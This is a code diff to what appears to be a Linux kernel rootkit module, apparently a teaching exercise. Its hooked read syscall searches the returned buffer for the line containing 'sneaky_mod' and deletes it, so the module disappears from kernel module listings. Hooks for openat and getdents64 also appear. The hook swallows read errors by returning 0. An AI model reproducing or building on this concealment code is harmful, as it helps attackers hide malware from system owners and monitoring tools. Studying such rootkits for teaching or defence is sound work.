@@ -48,7 +48,7 @@ int disable_page_rw(void *ptr)
 //    should expect it find its arguments on the stack (not in registers).
 
 //*****************
-// openat         
+// openat
 //*****************
 
 asmlinkage int (*original_openat)(struct pt_regs *);
@@ -109,11 +109,27 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs)
 asmlinkage int (*original_read)(struct pt_regs *regs);
 asmlinkage int sneaky_read(struct pt_regs *regs)
 {
-  int fd = (int)regs->di;
-  char __user *buf = (char __user *)regs->si;
+  int fd = regs->di;
+  void *buf = regs->si;
   size_t count = (size_t)regs->dx;
   int nread = (*original_read)(regs);
-  
+
+  if (nread <= 0)
+  {
+    return 0;
+  }
+  void *st = strnstr(buf, "sneaky_mod", nread);
+  if (st != NULL)
+  {
+    void *ed = strnstr(st, "\n", nread - (st - buf));
+    if (ed != NULL)
+    {
+      int len = ed - st + 1;
+      memmove(st, ed + 1, nread - (st - buf) - len);
+      nread -= len;
+    }
+  }
+
   return nread;
 }
 
